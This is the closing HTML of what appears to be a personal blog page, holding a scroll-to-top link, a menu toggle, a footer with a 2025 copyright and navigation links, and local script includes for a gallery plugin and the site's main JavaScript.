        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

      
      <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2025 3inter
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/home/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

      
<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- Google Analytics -->

<!-- Disqus Comments -->


    </div>
</body>
</html>
